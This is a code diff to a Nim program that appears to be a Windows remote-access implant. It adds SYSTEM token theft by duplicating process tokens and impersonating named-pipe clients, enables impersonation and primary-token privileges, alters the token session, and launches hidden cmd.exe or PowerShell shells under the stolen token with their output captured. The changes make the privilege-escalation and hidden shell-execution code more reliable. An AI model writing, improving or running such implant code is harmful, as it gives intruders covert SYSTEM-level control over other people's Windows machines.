@@ -66,6 +66,15 @@ when defined(windows):
     OpenAsSelf: WINBOOL, TokenHandle: ptr HANDLE
   ): WINBOOL {.importc, stdcall, dynlib: "advapi32".}
 
+  proc SetTokenInformation(
+    TokenHandle: HANDLE, TokenInformationClass: int32,
+    TokenInformation: pointer, TokenInformationLength: DWORD
+  ): WINBOOL {.importc, stdcall, dynlib: "advapi32".}
+
+  # Forward declaration: the shell path is defined before the privilege
+  # helper below, but needs to enable the token-launch privileges first.
+  proc enablePriv(hToken: HANDLE; privName: string): bool
+
   var gIshellProc:    HANDLE = 0
   var gIshellStdinW:  HANDLE = 0
   var gIshellStdoutR: HANDLE = 0
@@ -115,46 +124,107 @@ proc runShell*(cmd: string): string =
   try:
     when defined(windows):
       if gSystemToken != 0:
-        # seclogon duplicates handles listed in STARTUPINFOW.hStdOutput/hStdError
-        # into the child process. Create an inheritable file handle and pass it
-        # explicitly; run via "cmd.exe /c CMD" with no shell redirect in cmdline.
-        let uid = GetCurrentProcessId() xor GetTickCount()
-        let outFile = "C:\\Users\\Public\\sb" & toHex(int(uid), 8) & ".out"
-        var saOut: SECURITY_ATTRIBUTES
-        saOut.nLength = DWORD(sizeof(saOut)); saOut.bInheritHandle = WINBOOL(1)
-        let hFile = CreateFileA(outFile, GENERIC_WRITE,
-          FILE_SHARE_READ or FILE_SHARE_WRITE, addr saOut,
-          CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0)
-        if hFile == INVALID_HANDLE_VALUE:
-          return "[error: CreateFile " & $GetLastError() & "]"
-        let cli = "cmd.exe /c " & cmd
+        # Use an anonymous pipe and a primary-token launch.  The previous
+        # implementation redirected to C:\Users\Public\sb*.out, which could
+        # leave an empty file even when cmd.exe failed to start and concealed
+        # the actual CreateProcess error.
+        let shellArgs = "/d /c " & cmd & " 2>&1"
+        var sa: SECURITY_ATTRIBUTES
+        zeroMem(addr sa, sizeof(sa))
+        sa.nLength = DWORD(sizeof(sa)); sa.bInheritHandle = WINBOOL(1)
+        var hRead, hWrite: HANDLE
+        if CreatePipe(addr hRead, addr hWrite, addr sa, 0) == 0:
+          return "[error: CreatePipe " & $GetLastError() & "]"
+        if SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0) == 0:
+          let e = GetLastError()
+          discard CloseHandle(hRead); discard CloseHandle(hWrite)
+          return "[error: SetHandleInformation " & $e & "]"
+
+        var hSelf: HANDLE
+        if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY,
+            addr hSelf) != 0:
+          discard enablePriv(hSelf, "SeImpersonatePrivilege")
+          discard enablePriv(hSelf, "SeIncreaseQuotaPrivilege")
+          discard enablePriv(hSelf, "SeAssignPrimaryTokenPrivilege")
+          discard CloseHandle(hSelf)
+        discard enablePriv(gSystemToken, "SeImpersonatePrivilege")
+        discard enablePriv(gSystemToken, "SeIncreaseQuotaPrivilege")
+        discard enablePriv(gSystemToken, "SeAssignPrimaryTokenPrivilege")
+
         var si: STARTUPINFOW; zeroMem(addr si, sizeof(si))
         si.cb = DWORD(sizeof(si))
-        si.dwFlags = DWORD(STARTF_USESTDHANDLES)
-        si.hStdInput = 0; si.hStdOutput = hFile; si.hStdError = hFile
+        si.dwFlags = DWORD(STARTF_USESTDHANDLES or STARTF_USESHOWWINDOW)
+        si.wShowWindow = WORD(SW_HIDE)
+        si.hStdInput = 0; si.hStdOutput = hWrite; si.hStdError = hWrite
         var pi: PROCESS_INFORMATION; zeroMem(addr pi, sizeof(pi))
-        let impOk = ImpersonateLoggedOnUser(gSystemToken)
-        let impErr = GetLastError()
-        var procOk: WINBOOL = 0
-        var procErr: DWORD = 0
-        if impOk != 0:
-          procOk = CreateProcessWithTokenW(gSystemToken, 0, nil, newWideCString(cli),
-            CREATE_NO_WINDOW, nil, nil, addr si, addr pi)
-          procErr = GetLastError()
-          discard RevertToSelf()
-        discard CloseHandle(hFile)  # parent closes its copy; child holds its own
-        if impOk == 0:
-          discard DeleteFileA(outFile)
-          return "[error: ImpersonateLoggedOnUser " & $impErr & "]"
+        let appW = newWideCString("C:\\Windows\\System32\\cmd.exe")
+        let cwdW = newWideCString("C:\\Windows\\System32")
+        var argsW = newWideCString(shellArgs)
+        var argsAsUserW = newWideCString(shellArgs)
+        var procOk: WINBOOL = CreateProcessWithTokenW(gSystemToken, 0, appW, argsW,
+          CREATE_NO_WINDOW, nil, cwdW, addr si, addr pi)
+        var withTokenErr: DWORD = if procOk != 0: 0 else: GetLastError()
+        var asUserErr: DWORD = 0
+        var impErr: DWORD = 0
         if procOk == 0:
-          discard DeleteFileA(outFile)
-          return "[error: CreateProcessWithTokenW " & $procErr & "]"
-        discard WaitForSingleObject(pi.hProcess, 60000)
+          procOk = CreateProcessAsUserW(gSystemToken, appW, argsAsUserW, nil, nil,
+            WINBOOL(1), CREATE_NO_WINDOW, nil, cwdW, addr si, addr pi)
+          if procOk == 0: asUserErr = GetLastError()
+        if procOk == 0:
+          let impOk = ImpersonateLoggedOnUser(gSystemToken)
+          if impOk == 0:
+            impErr = GetLastError()
+          else:
+            var retryW = newWideCString(shellArgs)
+            procOk = CreateProcessWithTokenW(gSystemToken, 0, appW, retryW,
+              CREATE_NO_WINDOW, nil, cwdW, addr si, addr pi)
+            if procOk == 0: withTokenErr = GetLastError()
+            discard RevertToSelf()
+        discard CloseHandle(hWrite)
+        if procOk == 0:
+          discard CloseHandle(hRead)
+          return "[error: SYSTEM shell launch; WithToken=" & $withTokenErr &
+            "; AsUser=" & $asUserErr & "; Impersonate=" & $impErr & "]"
+
+        var output = ""
+        var buf: array[4096, char]
+        var timedOut = false
+        var exitCode: DWORD = DWORD(259) # STILL_ACTIVE
+        let started = GetTickCount()
+        while true:
+          var avail: DWORD = 0
+          if PeekNamedPipe(hRead, nil, 0, nil, addr avail, nil) != 0 and avail > 0:
+            var nRead: DWORD = 0
+            let want = min(avail, DWORD(buf.len))
+            if ReadFile(hRead, addr buf[0], want, addr nRead, nil) != 0 and nRead > 0:
+              let start = output.len
+              output.setLen(start + int(nRead))
+              copyMem(addr output[start], addr buf[0], int(nRead))
+              continue
+          if GetExitCodeProcess(pi.hProcess, addr exitCode) != 0 and exitCode != DWORD(259):
+            # Drain bytes already buffered after the child exits.
+            while true:
+              avail = 0
+              if PeekNamedPipe(hRead, nil, 0, nil, addr avail, nil) == 0 or avail == 0: break
+              var nRead: DWORD = 0
+              let want = min(avail, DWORD(buf.len))
+              if ReadFile(hRead, addr buf[0], want, addr nRead, nil) == 0 or nRead == 0: break
+              let start = output.len
+              output.setLen(start + int(nRead))
+              copyMem(addr output[start], addr buf[0], int(nRead))
+            break
+          if GetTickCount() - started >= DWORD(60000):
+            timedOut = true
+            discard TerminateProcess(pi.hProcess, 1)
+            break
+          Sleep(DWORD(10))
+        discard CloseHandle(hRead)
         discard CloseHandle(pi.hProcess); discard CloseHandle(pi.hThread)
-        var buf = ""
-        try: buf = readFile(outFile) except: discard
-        discard DeleteFileA(outFile)
-        return buf
+        if timedOut and output.len == 0: return "[error: SYSTEM shell capture timed out]"
+        if output.len == 0:
+          return "[error: SYSTEM shell capture empty; exit=" & $exitCode &
+            "; WithToken=" & $withTokenErr & "; AsUser=" & $asUserErr & "]"
+        return output
       let (output, _) = execCmdEx("cmd.exe /s /c \"" & cmd & "\"")
       return output
     else:
@@ -739,7 +809,36 @@ when defined(windows):
     tp.PrivilegeCount = 1
     tp.Privileges[0].Luid = luid
     tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
-    return AdjustTokenPrivileges(hToken, 0, addr tp, DWORD(sizeof(tp)), nil, nil).bool
+    if AdjustTokenPrivileges(hToken, 0, addr tp, DWORD(sizeof(tp)), nil, nil) == 0:
+      return false
+    # TRUE from AdjustTokenPrivileges can still mean ERROR_NOT_ALL_ASSIGNED.
+    return GetLastError() != DWORD(1300) # ERROR_NOT_ALL_ASSIGNED
+
+  proc normalizeTokenSession(token: HANDLE) =
+    ## Adjust token's session ID to match our process so cmd.exe can initialise
+    ## user32.dll.  A cross-session token (winlogon = Session 1, agent = Session 0)
+    ## causes STATUS_DLL_INIT_FAILED.  Requires SeTcbPrivilege on calling thread.
+    const tokenSessionId: int32 = 12 # TOKEN_INFORMATION_CLASS::TokenSessionId
+    var hSelf: HANDLE = 0
+    if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, addr hSelf) == 0: return
+    var sessionId: DWORD = 0
+    var retLen: DWORD = 0
+    discard GetTokenInformation(hSelf, cast[TOKEN_INFORMATION_CLASS](tokenSessionId),
+      addr sessionId, DWORD(sizeof(sessionId)), addr retLen)
+    discard CloseHandle(hSelf)
+    discard SetTokenInformation(token, tokenSessionId,
+      addr sessionId, DWORD(sizeof(sessionId)))
+
+  proc duplicatePrimaryShellToken(source: HANDLE): HANDLE =
+    ## Prefer delegation for CreateProcess*; filtered tokens may only permit
+    ## the ordinary impersonation level, so retain the compatibility fallback.
+    var hPrim: HANDLE = 0
+    discard DuplicateTokenEx(source, TOKEN_ALL_ACCESS, nil,
+      securityDelegation, tokenPrimary, addr hPrim)
+    if hPrim == 0:
+      discard DuplicateTokenEx(source, TOKEN_ALL_ACCESS, nil,
+        securityImpersonation, tokenPrimary, addr hPrim)
+    return hPrim
 
   # ── Token steal ──────────────────────────────────────────────────────────────
   proc doTokenSteal(pid: int): string =
@@ -810,14 +909,17 @@ when defined(windows):
       if OpenProcessToken(hProc, TOKEN_DUPLICATE, addr hTok) == 0: break t1
       defer: discard CloseHandle(hTok)
       var hPrim, hDup: HANDLE
-      discard DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, nil,
-        securityImpersonation, tokenPrimary, addr hPrim)
+      hPrim = duplicatePrimaryShellToken(hTok)
       discard DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, nil,
         securityImpersonation, tokenImpersonation, addr hDup)
-      if hDup == 0: (if hPrim != 0: discard CloseHandle(hPrim)); break t1
+      if hPrim == 0 or hDup == 0:
+        if hPrim != 0: discard CloseHandle(hPrim)
+        if hDup != 0: discard CloseHandle(hDup)
+        break t1
       if ImpersonateLoggedOnUser(hDup) == 0:
         discard CloseHandle(hDup); (if hPrim != 0: discard CloseHandle(hPrim)); break t1
       discard CloseHandle(hDup)
+      normalizeTokenSession(hPrim)
       if gSystemToken != 0: discard CloseHandle(gSystemToken)
       gSystemToken = hPrim
       return "[+] T1 SYSTEM (" & matchName & " PID=" & $sysPid & ")"
@@ -871,16 +973,20 @@ when defined(windows):
 
     if ImpersonateNamedPipeClient(hPipe) == 0:
       return "[-] T1+T2 failed (ImpersonateNamedPipeClient err " & $GetLastError() & ")"
+    var storedT2 = false
     block storeT2:
       var hThr: HANDLE = 0
       if OpenThreadToken(GetCurrentThread(), TOKEN_DUPLICATE or TOKEN_ALL_ACCESS,
           WINBOOL(0), addr hThr) != 0:
-        var hPrim: HANDLE = 0
-        discard DuplicateTokenEx(hThr, TOKEN_ALL_ACCESS, nil,
-          securityImpersonation, tokenPrimary, addr hPrim)
+        var hPrim: HANDLE = duplicatePrimaryShellToken(hThr)
         discard CloseHandle(hThr)
-        if gSystemToken != 0: discard CloseHandle(gSystemToken)
-        gSystemToken = hPrim
+        if hPrim != 0:
+          normalizeTokenSession(hPrim)
+          if gSystemToken != 0: discard CloseHandle(gSystemToken)
+          gSystemToken = hPrim
+          storedT2 = true
+    if not storedT2:
+      return "[-] T1+T2 failed (DuplicateTokenEx primary token)"
     return "[+] T2 SYSTEM (named pipe + service)"
 
   # ── Token Store ──────────────────────────────────────────────────────────────
@@ -918,6 +1024,7 @@ when defined(windows):
   proc doIshellOpen(shell: string): string =
     if gIshellProc != 0: return "[-] interactive shell already open"
     var sa: SECURITY_ATTRIBUTES
+    zeroMem(addr sa, sizeof(sa))
     sa.nLength = DWORD(sizeof(sa)); sa.bInheritHandle = WINBOOL(1)
     var stdinR, stdinW, stdoutR, stdoutW: HANDLE
     if CreatePipe(addr stdinR, addr stdinW, addr sa, 0) == 0: return "CreatePipe(stdin) failed"
@@ -927,15 +1034,58 @@ when defined(windows):
     discard SetHandleInformation(stdinW, HANDLE_FLAG_INHERIT, 0)
     discard SetHandleInformation(stdoutR, HANDLE_FLAG_INHERIT, 0)
     var si: STARTUPINFOW
-    si.cb = DWORD(sizeof(si)); si.dwFlags = DWORD(STARTF_USESTDHANDLES)
+    zeroMem(addr si, sizeof(si))
+    si.cb = DWORD(sizeof(si)); si.dwFlags = DWORD(STARTF_USESTDHANDLES or STARTF_USESHOWWINDOW)
+    si.wShowWindow = WORD(SW_HIDE)
     si.hStdInput = stdinR; si.hStdOutput = stdoutW; si.hStdError = stdoutW
     var pi: PROCESS_INFORMATION
-    let shellExe = if shell == "ps": "powershell.exe" else: "cmd.exe"
-    var cmdW = newWideCString(shellExe)
-    if CreateProcessW(nil, cmdW, nil, nil, WINBOOL(1), 0, nil, nil, addr si, addr pi) == 0:
+    zeroMem(addr pi, sizeof(pi))
+    let shellIsPs = shell == "ps" or shell == "powershell"
+    let shellExe = if shellIsPs: "powershell.exe" else: "cmd.exe"
+    var procOk: WINBOOL = 0
+    var launchErr: DWORD = 0
+    if gSystemToken != 0:
+      var hSelf: HANDLE
+      if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY,
+          addr hSelf) != 0:
+        discard enablePriv(hSelf, "SeImpersonatePrivilege")
+        discard enablePriv(hSelf, "SeIncreaseQuotaPrivilege")
+        discard enablePriv(hSelf, "SeAssignPrimaryTokenPrivilege")
+        discard CloseHandle(hSelf)
+      discard enablePriv(gSystemToken, "SeImpersonatePrivilege")
+      discard enablePriv(gSystemToken, "SeIncreaseQuotaPrivilege")
+      discard enablePriv(gSystemToken, "SeAssignPrimaryTokenPrivilege")
+      let appPath = if shellIsPs: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" else: "C:\\Windows\\System32\\cmd.exe"
+      let childArgs = if shellIsPs: "-NoLogo -NoProfile -NonInteractive" else: "/Q"
+      let appW = newWideCString(appPath)
+      var argsW = newWideCString(childArgs)
+      var argsAsUserW = newWideCString(childArgs)
+      procOk = CreateProcessWithTokenW(gSystemToken, 0, appW, argsW,
+        CREATE_NO_WINDOW, nil, newWideCString("C:\\Windows\\System32"), addr si, addr pi)
+      launchErr = if procOk != 0: 0 else: GetLastError()
+      if procOk == 0:
+        procOk = CreateProcessAsUserW(gSystemToken, appW, argsAsUserW, nil, nil,
+          WINBOOL(1), CREATE_NO_WINDOW, nil, newWideCString("C:\\Windows\\System32"), addr si, addr pi)
+        if procOk == 0: launchErr = GetLastError()
+      if procOk == 0:
+        let impOk = ImpersonateLoggedOnUser(gSystemToken)
+        if impOk != 0:
+          var retryW = newWideCString(childArgs)
+          procOk = CreateProcessWithTokenW(gSystemToken, 0, appW, retryW,
+            CREATE_NO_WINDOW, nil, newWideCString("C:\\Windows\\System32"), addr si, addr pi)
+          if procOk == 0: launchErr = GetLastError()
+          discard RevertToSelf()
+        else:
+          launchErr = GetLastError()
+    else:
+      var cmdW = newWideCString(shellExe)
+      procOk = CreateProcessW(nil, cmdW, nil, nil, WINBOOL(1), CREATE_NO_WINDOW,
+        nil, nil, addr si, addr pi)
+      if procOk == 0: launchErr = GetLastError()
+    if procOk == 0:
       discard CloseHandle(stdinR); discard CloseHandle(stdinW)
       discard CloseHandle(stdoutR); discard CloseHandle(stdoutW)
-      return "CreateProcess failed (err " & $GetLastError() & ")"
+      return "CreateProcess shell failed (err " & $launchErr & ")"
     discard CloseHandle(pi.hThread); discard CloseHandle(stdinR); discard CloseHandle(stdoutW)
     gIshellProc = pi.hProcess; gIshellStdinW = stdinW; gIshellStdoutR = stdoutR
     return "[+] shell opened (" & shellExe & ")"
